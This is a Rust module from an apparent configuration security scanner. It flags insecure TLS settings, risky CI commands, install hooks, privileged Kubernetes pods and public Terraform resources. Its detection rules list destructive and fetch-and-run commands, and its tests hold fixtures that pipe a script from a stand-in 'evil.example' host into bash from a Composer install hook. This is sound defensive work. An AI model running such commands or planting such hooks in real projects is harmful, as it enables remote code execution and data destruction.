use crate::types::{Finding, Location, Severity};
use std::path::Path;

#[allow(clippy::too_many_arguments)]
fn push(
    out: &mut Vec<Finding>,
    path: &Path,
    line: Option<usize>,
    rule: &str,
    severity: Severity,
    confidence: f32,
    message: String,
    snippet: Option<String>,
    tags: &[&str],
) {
    let path_str = path.display().to_string();
    let suffix = line.map(|l| format!("-{}", l)).unwrap_or_default();
    out.push(Finding {
        id: format!("{}-{}{}", rule, path_str, suffix),
        severity,
        confidence,
        rule: rule.to_string(),
        category: "config".to_string(),
        location: Location {
            path: path_str,
            line,
            column: None,
        },
        message,
        snippet: snippet.map(|s| s.chars().take(200).collect()),
        tags: tags.iter().map(|t| t.to_string()).collect(),
    });
}

fn code_of(line: &str) -> &str {
    let end = line.find('#').unwrap_or(line.len());
    line[..end].trim()
}

fn truncate(value: &str) -> String {
    value.chars().take(160).collect()
}

/// Classify a shell command embedded in a CI/build configuration.
fn command_risk(command: &str) -> Option<(&'static str, Severity)> {
    let lower = command.to_lowercase();
    let remote = lower.contains("curl ")
        || lower.contains("curl\t")
        || lower.contains("wget ")
        || lower.contains("invoke-webrequest")
        || lower.contains("iwr ");
    let piped_shell = lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("| zsh")
        || lower.contains("|zsh")
        || lower.contains("| powershell")
        || lower.contains("| iex");
    if remote && piped_shell {
        return Some((
            "downloads and pipes a remote script into a shell",
            Severity::High,
        ));
    }
    if lower.contains("rm -rf /")
        || lower.contains("remove-item -recurse -force c:\\")
        || lower.contains("mkfs.")
        || lower.contains("dd if=/dev/zero")
    {
        return Some((
            "contains a destructive filesystem command",
            Severity::Critical,
        ));
    }
    if lower.contains("base64 -d")
        || lower.contains("base64 --decode")
        || lower.contains("frombase64string")
    {
        return Some(("decodes a base64 payload", Severity::High));
    }
    if lower.contains("eval ")
        || lower.contains("eval(")
        || lower.contains("invoke-expression")
        || lower.contains("iex(")
        || lower.contains("iex ")
    {
        return Some(("evaluates dynamically generated code", Severity::High));
    }
    if lower.contains("chmod 777") || lower.contains("chmod +x /tmp/") {
        return Some(("makes files world-writable/executable", Severity::Medium));
    }
    if lower.contains("http://") {
        return Some(("fetches content over plain HTTP", Severity::Medium));
    }
    None
}

fn check_command(
    out: &mut Vec<Finding>,
    path: &Path,
    line: usize,
    command: &str,
    rule: &str,
    tag: &str,
) {
    if let Some((reason, severity)) = command_risk(command) {
        push(
            out,
            path,
            Some(line),
            rule,
            severity,
            0.8,
            format!("CI/install command {}", reason),
            Some(truncate(command)),
            &["ci", tag],
        );
    }
}

fn scan_env(path: &Path, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let name = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("")
        .to_lowercase();
    if name.ends_with(".example")
        || name.ends_with(".sample")
        || name.ends_with(".template")
        || name.ends_with(".dist")
    {
        return out;
    }
    const INSECURE: &[(&str, &str)] = &[
        (
            "node_tls_reject_unauthorized=0",
            "disables TLS certificate validation for Node.js",
        ),
        (
            "pythonhttpsverify=0",
            "disables HTTPS certificate verification for Python",
        ),
        (
            "git_ssl_no_verify=true",
            "disables TLS verification for Git",
        ),
        ("ssl_verify=false", "disables TLS verification"),
        ("tls_verify=false", "disables TLS verification"),
        ("verify_ssl=false", "disables TLS verification"),
        ("curl_ca_bundle=", "clears the CA bundle used by curl"),
        (
            "docker_tls_verify=0",
            "disables Docker daemon TLS verification",
        ),
        ("aws_s3_use_ssl=false", "disables TLS for S3 requests"),
        ("composer_disable_tls=1", "disables TLS for Composer"),
        ("strict-ssl=false", "disables TLS verification for npm"),
    ];
    for (i, line) in content.lines().enumerate() {
        let code = code_of(line);
        if code.is_empty() || code.starts_with(';') {
            continue;
        }
        let lower = code.to_lowercase();
        for (needle, reason) in INSECURE {
            if lower.starts_with(needle) {
                push(
                    &mut out,
                    path,
                    Some(i + 1),
                    "config.insecure-tls",
                    Severity::High,
                    0.85,
                    format!("Environment setting {}", reason),
                    Some(truncate(code)),
                    &["env", "tls"],
                );
                break;
            }
        }
        if lower.starts_with("debug=true") || lower.starts_with("app_debug=true") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.debug-enabled",
                Severity::Low,
                0.6,
                "Debug mode is enabled in an environment file".to_string(),
                Some(truncate(code)),
                &["env", "debug"],
            );
        }
    }
    out
}

fn scan_gitlab_ci(path: &Path, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    for (i, line) in content.lines().enumerate() {
        let code = code_of(line);
        if code.is_empty() {
            continue;
        }
        let lower = code.to_lowercase();
        if (lower.starts_with("include:")
            && (lower.contains("http://") || lower.contains("https://")))
            || (lower.contains("remote:") && lower.contains("http"))
        {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.ci-remote-include",
                Severity::Medium,
                0.7,
                "GitLab CI includes a remote configuration file".to_string(),
                Some(truncate(code)),
                &["ci", "gitlab"],
            );
        }
        if lower.starts_with("image:") {
            let image = code.split_once(':').map(|(_, v)| v.trim()).unwrap_or("");
            let image = image.trim_matches(|c| c == '\'' || c == '"');
            if image.ends_with(":latest") || (!image.contains(':') && !image.is_empty()) {
                push(
                    &mut out,
                    path,
                    Some(i + 1),
                    "config.ci-unpinned-image",
                    Severity::Low,
                    0.6,
                    format!("CI job uses an unpinned image '{}'", image),
                    Some(truncate(code)),
                    &["ci", "gitlab", "supply-chain"],
                );
            }
        }
        check_command(
            &mut out,
            path,
            i + 1,
            code,
            "config.ci-shell-command",
            "gitlab",
        );
    }
    out
}

fn scan_circleci(path: &Path, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    for (i, line) in content.lines().enumerate() {
        let code = code_of(line).trim_start_matches("- ").trim();
        if code.is_empty() {
            continue;
        }
        let lower = code.to_lowercase();
        if lower.starts_with("image:") {
            let image = code.split_once(':').map(|(_, v)| v.trim()).unwrap_or("");
            if image.ends_with(":latest") || (!image.contains(':') && !image.is_empty()) {
                push(
                    &mut out,
                    path,
                    Some(i + 1),
                    "config.ci-unpinned-image",
                    Severity::Low,
                    0.6,
                    format!("CircleCI uses an unpinned image '{}'", image),
                    Some(truncate(code)),
                    &["ci", "circleci", "supply-chain"],
                );
            }
        }
        check_command(
            &mut out,
            path,
            i + 1,
            code,
            "config.ci-shell-command",
            "circleci",
        );
    }
    out
}

fn scan_jenkins(path: &Path, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    for (i, line) in content.lines().enumerate() {
        let code = code_of(line);
        if code.is_empty() {
            continue;
        }
        let lower = code.to_lowercase();
        if (lower.contains("sh('") || lower.contains("sh(\"") || lower.contains("bat("))
            && lower.contains("curl")
            && (lower.contains("| sh") || lower.contains("| bash"))
        {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.ci-remote-script",
                Severity::High,
                0.85,
                "Jenkins pipeline downloads and executes a remote shell script".to_string(),
                Some(truncate(code)),
                &["ci", "jenkins"],
            );
        }
        check_command(
            &mut out,
            path,
            i + 1,
            code,
            "config.ci-shell-command",
            "jenkins",
        );
    }
    out
}

fn scan_composer(path: &Path, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let Ok(value) = serde_json::from_str::<serde_json::Value>(content) else {
        return out;
    };
    let script_keys = [
        "pre-install-cmd",
        "post-install-cmd",
        "pre-update-cmd",
        "post-update-cmd",
        "post-autoload-dump",
        "post-root-package-install",
        "post-create-project-cmd",
    ];
    if let Some(scripts) = value.get("scripts").and_then(|v| v.as_object()) {
        for key in script_keys {
            let Some(entry) = scripts.get(key) else {
                continue;
            };
            let commands: Vec<String> = match entry {
                serde_json::Value::String(s) => vec![s.clone()],
                serde_json::Value::Array(values) => values
                    .iter()
                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
                    .collect(),
                _ => Vec::new(),
            };
            for command in commands {
                if let Some((reason, severity)) = command_risk(&command) {
                    push(
                        &mut out,
                        path,
                        None,
                        "config.composer-install-hook",
                        severity.max(Severity::High),
                        0.85,
                        format!("Composer hook '{}' {}: {}", key, reason, truncate(&command)),
                        Some(truncate(&command)),
                        &["composer", "install-hook"],
                    );
                }
            }
        }
    }
    if let Some(config) = value.get("config").and_then(|v| v.as_object()) {
        if config.get("secure-http").and_then(|v| v.as_bool()) == Some(false) {
            push(
                &mut out,
                path,
                None,
                "config.composer-insecure-http",
                Severity::High,
                0.85,
                "Composer secure-http is disabled".to_string(),
                Some("config.secure-http = false".to_string()),
                &["composer", "tls"],
            );
        }
    }
    if let Some(repositories) = value.get("repositories").and_then(|v| v.as_array()) {
        for repo in repositories {
            if let Some(url) = repo.get("url").and_then(|v| v.as_str()) {
                if url.to_lowercase().starts_with("http://") {
                    push(
                        &mut out,
                        path,
                        None,
                        "config.composer-insecure-repository",
                        Severity::High,
                        0.8,
                        format!("Composer repository uses plain HTTP: {}", url),
                        Some(truncate(url)),
                        &["composer", "tls"],
                    );
                }
            }
        }
    }
    out
}

fn scan_gemfile(path: &Path, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    for (i, line) in content.lines().enumerate() {
        let code = code_of(line);
        let lower = code.to_lowercase();
        if lower.starts_with("source ") && lower.contains("http://") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.gemfile-insecure-source",
                Severity::High,
                0.85,
                "Gemfile source uses plain HTTP".to_string(),
                Some(truncate(code)),
                &["gemfile", "tls"],
            );
        }
        if lower.contains("git:") && lower.contains("http://") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.gemfile-insecure-git",
                Severity::High,
                0.8,
                "Gemfile fetches a dependency over plain HTTP".to_string(),
                Some(truncate(code)),
                &["gemfile", "tls"],
            );
        }
        if lower.contains("eval(")
            || lower.contains("system(")
            || lower.contains("`")
            || lower.contains("io.popen")
        {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.gemfile-dynamic-code",
                Severity::Medium,
                0.7,
                "Gemfile executes dynamic code or a shell command".to_string(),
                Some(truncate(code)),
                &["gemfile", "dynamic"],
            );
        }
        check_command(
            &mut out,
            path,
            i + 1,
            code,
            "config.gemfile-shell-command",
            "gemfile",
        );
    }
    out
}

fn scan_pipfile(path: &Path, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let mut section = String::new();
    for (i, line) in content.lines().enumerate() {
        let code = code_of(line);
        if code.is_empty() {
            continue;
        }
        if code.starts_with('[') && code.ends_with(']') {
            section = code
                .trim_start_matches('[')
                .trim_end_matches(']')
                .to_lowercase();
            continue;
        }
        let lower = code.to_lowercase();
        if section == "sources" && lower.starts_with("url") && lower.contains("http://") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.pipfile-insecure-source",
                Severity::High,
                0.85,
                "Pipfile package index uses plain HTTP".to_string(),
                Some(truncate(code)),
                &["pipfile", "tls"],
            );
        }
        if section == "sources" && lower.starts_with("verify_ssl") && lower.contains("false") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.pipfile-insecure-source",
                Severity::High,
                0.85,
                "Pipfile disables TLS verification for package downloads".to_string(),
                Some(truncate(code)),
                &["pipfile", "tls"],
            );
        }
        if section == "scripts" {
            if let Some((reason, severity)) = command_risk(code) {
                push(
                    &mut out,
                    path,
                    Some(i + 1),
                    "config.pipfile-script",
                    severity,
                    0.8,
                    format!("Pipenv script {}", reason),
                    Some(truncate(code)),
                    &["pipfile", "script"],
                );
            }
        }
    }
    out
}

fn scan_kubernetes(path: &Path, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let lower_all = content.to_lowercase();
    let is_kubernetes = (lower_all.contains("apiversion:") && lower_all.contains("kind:"))
        || lower_all.contains("helm.sh/");
    if !is_kubernetes {
        return out;
    }
    let cluster_admin = lower_all.contains("cluster-admin");
    for (i, line) in content.lines().enumerate() {
        let code = code_of(line);
        let item = code.trim_start_matches("- ").trim();
        let lower = item.to_lowercase().replace(' ', "");
        if lower.starts_with("privileged:true") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.kubernetes-privileged",
                Severity::Critical,
                0.9,
                "Container runs in privileged mode (host access)".to_string(),
                Some(truncate(code)),
                &["kubernetes", "container"],
            );
        }
        if lower.starts_with("hostnetwork:true")
            || lower.starts_with("hostpid:true")
            || lower.starts_with("hostipc:true")
        {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.kubernetes-host-namespace",
                Severity::High,
                0.85,
                "Pod shares a host namespace".to_string(),
                Some(truncate(code)),
                &["kubernetes", "container"],
            );
        }
        if lower.starts_with("hostpath:") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.kubernetes-hostpath",
                Severity::High,
                0.8,
                "Pod mounts a host filesystem path".to_string(),
                Some(truncate(code)),
                &["kubernetes", "container"],
            );
        }
        if lower.starts_with("runasuser:0") || lower.starts_with("runasnonroot:false") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.kubernetes-root",
                Severity::Medium,
                0.75,
                "Container runs as root".to_string(),
                Some(truncate(code)),
                &["kubernetes", "container"],
            );
        }
        if lower.starts_with("allowprivilegeescalation:true") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.kubernetes-privilege-escalation",
                Severity::High,
                0.85,
                "Container allows privilege escalation".to_string(),
                Some(truncate(code)),
                &["kubernetes", "container"],
            );
        }
        if lower.contains("-sys_admin")
            || lower.contains("-sys_module")
            || lower.contains("-sys_ptrace")
            || lower.contains("-dac_read_search")
        {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.kubernetes-dangerous-capability",
                Severity::High,
                0.85,
                "Container adds a dangerous Linux capability".to_string(),
                Some(truncate(code)),
                &["kubernetes", "container"],
            );
        }
        if lower.starts_with("image:") {
            let image = item
                .split_once(':')
                .map(|(_, value)| value.trim())
                .unwrap_or("");
            if image.ends_with(":latest") || (!image.contains(':') && !image.contains('@')) {
                push(
                    &mut out,
                    path,
                    Some(i + 1),
                    "config.kubernetes-unpinned-image",
                    Severity::Low,
                    0.6,
                    "Workload uses an unpinned container image".to_string(),
                    Some(truncate(code)),
                    &["kubernetes", "supply-chain"],
                );
            }
        }
    }
    if cluster_admin {
        push(
            &mut out,
            path,
            None,
            "config.kubernetes-cluster-admin",
            Severity::High,
            0.8,
            "Manifest grants the cluster-admin role".to_string(),
            Some("cluster-admin".to_string()),
            &["kubernetes", "rbac"],
        );
    }
    out
}

fn scan_terraform(path: &Path, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let mut in_actions = false;
    for (i, line) in content.lines().enumerate() {
        let code = code_of(line).trim();
        if code.is_empty() || code.starts_with("//") {
            continue;
        }
        let lower = code.to_lowercase().replace(' ', "");
        let raw_lower = code.to_lowercase();
        if lower.contains("0.0.0.0/0") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.terraform-open-ingress",
                Severity::High,
                0.8,
                "Terraform allows ingress from any IPv4 address".to_string(),
                Some(truncate(code)),
                &["terraform", "network"],
            );
        }
        if lower.contains("publicly_accessible=true")
            || lower.contains("acl=\"public-read")
            || lower.contains("acl=\"public-read-write")
            || lower.contains("block_public_acls=false")
            || lower.contains("restrict_public_buckets=false")
        {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.terraform-public-resource",
                Severity::High,
                0.85,
                "Terraform exposes a resource publicly".to_string(),
                Some(truncate(code)),
                &["terraform", "public"],
            );
        }
        if lower.contains("storage_encrypted=false")
            || lower.contains("encrypted=false")
            || lower.contains("enable_key_rotation=false")
        {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.terraform-unencrypted",
                Severity::Medium,
                0.8,
                "Terraform disables encryption at rest".to_string(),
                Some(truncate(code)),
                &["terraform", "encryption"],
            );
        }
        if lower.contains("force_destroy=true") || lower.contains("skip_final_snapshot=true") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.terraform-unsafe-lifecycle",
                Severity::Medium,
                0.7,
                "Terraform enables destructive resource replacement".to_string(),
                Some(truncate(code)),
                &["terraform", "lifecycle"],
            );
        }
        if lower.contains("insecure=true") || lower.contains("skip_credentials_validation=true") {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.terraform-insecure-provider",
                Severity::High,
                0.8,
                "Terraform provider disables transport security or credential checks".to_string(),
                Some(truncate(code)),
                &["terraform", "tls"],
            );
        }
        if lower.starts_with("actions") || lower.starts_with("action") {
            in_actions = true;
        }
        if in_actions
            && (lower.contains("\"*\"") || lower.contains("'*'") || lower.contains("[*]"))
            && (raw_lower.contains("action") || raw_lower.contains("principal"))
        {
            push(
                &mut out,
                path,
                Some(i + 1),
                "config.terraform-wildcard-iam",
                Severity::High,
                0.8,
                "Terraform IAM policy grants wildcard access".to_string(),
                Some(truncate(code)),
                &["terraform", "iam"],
            );
        }
        if code.ends_with('}') {
            in_actions = false;
        }
    }
    out
}

/// Analyse configuration files, manifests, CI definitions, and infrastructure code.
pub fn scan(path: &Path, content: &str) -> Vec<Finding> {
    if content.is_empty() {
        return Vec::new();
    }
    let name = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("")
        .to_lowercase();
    let path_str = path.to_string_lossy().replace('\\', "/").to_lowercase();
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_lowercase();

    let mut out = Vec::new();

    let is_env = name == ".env"
        || (name.starts_with(".env.")
            && !name.ends_with(".example")
            && !name.ends_with(".sample")
            && !name.ends_with(".template"));
    if is_env {
        out.extend(scan_env(path, content));
    }
    if name == ".npmrc" || name == ".yarnrc" || name == ".yarnrc.yml" {
        for (i, line) in content.lines().enumerate() {
            let lower = code_of(line).to_lowercase();
            if lower.contains("registry=http://")
                || lower.contains("strict-ssl=false")
                || lower.contains("enable-strict-ssl=false")
            {
                push(
                    &mut out,
                    path,
                    Some(i + 1),
                    "config.npm-insecure-registry",
                    Severity::High,
                    0.85,
                    "npm registry configuration disables TLS or uses plain HTTP".to_string(),
                    Some(truncate(line.trim())),
                    &["npm", "tls"],
                );
            }
        }
    }

    if name == ".gitlab-ci.yml" || name == ".gitlab-ci.yaml" {
        out.extend(scan_gitlab_ci(path, content));
    }
    if path_str.ends_with(".circleci/config.yml") || path_str.ends_with(".circleci/config.yaml") {
        out.extend(scan_circleci(path, content));
    }
    if name == "jenkinsfile" || name.starts_with("jenkinsfile.") {
        out.extend(scan_jenkins(path, content));
    }
    if name == "composer.json" {
        out.extend(scan_composer(path, content));
    }
    if name == "gemfile" {
        out.extend(scan_gemfile(path, content));
    }
    if name == "pipfile" {
        out.extend(scan_pipfile(path, content));
    }
    if ext == "yaml" || ext == "yml" {
        out.extend(scan_kubernetes(path, content));
    }
    if ext == "tf" || ext == "tfvars" || name.ends_with(".tf.json") {
        out.extend(scan_terraform(path, content));
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(findings: &[Finding]) -> Vec<&str> {
        findings.iter().map(|f| f.rule.as_str()).collect()
    }

    #[test]
    fn detects_insecure_tls_env_settings() {
        let findings = scan(
            Path::new(".env"),
            "NODE_TLS_REJECT_UNAUTHORIZED=0\nDEBUG=true\n",
        );
        assert!(rules(&findings).contains(&"config.insecure-tls"));
        assert!(rules(&findings).contains(&"config.debug-enabled"));
    }

    #[test]
    fn detects_gitlab_remote_pipe_and_unpinned_image() {
        let content = "image: alpine\nscript:\n  - curl -sSf https://example.com/x.sh | sh\ninclude:\n  - remote: https://example.com/ci.yml\n";
        let findings = scan(Path::new(".gitlab-ci.yml"), content);
        assert!(rules(&findings).contains(&"config.ci-shell-command"));
        assert!(rules(&findings).contains(&"config.ci-unpinned-image"));
        assert!(rules(&findings).contains(&"config.ci-remote-include"));
    }

    #[test]
    fn detects_composer_install_hook() {
        let content = r#"{
          "scripts": {
            "post-install-cmd": ["curl -s https://evil.example/x.sh | bash"]
          },
          "config": { "secure-http": false }
        }"#;
        let findings = scan(Path::new("composer.json"), content);
        assert!(rules(&findings).contains(&"config.composer-install-hook"));
        assert!(rules(&findings).contains(&"config.composer-insecure-http"));
    }

    #[test]
    fn detects_privileged_kubernetes_workload() {
        let content = "apiVersion: v1\nkind: Pod\nspec:\n  hostNetwork: true\n  containers:\n    - image: nginx:latest\n      securityContext:\n        privileged: true\n        runAsUser: 0\n";
        let findings = scan(Path::new("pod.yaml"), content);
        assert!(rules(&findings).contains(&"config.kubernetes-privileged"));
        assert!(rules(&findings).contains(&"config.kubernetes-host-namespace"));
        assert!(rules(&findings).contains(&"config.kubernetes-root"));
        assert!(rules(&findings).contains(&"config.kubernetes-unpinned-image"));
    }

    #[test]
    fn detects_terraform_public_bucket_and_open_ingress() {
        let content = r#"
resource "aws_s3_bucket" "b" {
  acl = "public-read"
  force_destroy = true
}
resource "aws_security_group_rule" "r" {
  cidr_blocks = ["0.0.0.0/0"]
}
"#;
        let findings = scan(Path::new("main.tf"), content);
        assert!(rules(&findings).contains(&"config.terraform-public-resource"));
        assert!(rules(&findings).contains(&"config.terraform-open-ingress"));
        assert!(rules(&findings).contains(&"config.terraform-unsafe-lifecycle"));
    }

    #[test]
    fn ignores_benign_yaml_and_env_examples() {
        let yaml = scan(
            Path::new("values.yaml"),
            "name: app\nreplicas: 2\nimage: nginx:1.27\n",
        );
        assert!(yaml.is_empty());
        let env = scan(
            Path::new(".env.example"),
            "NODE_TLS_REJECT_UNAUTHORIZED=0\n",
        );
        assert!(env.is_empty());
    }
}
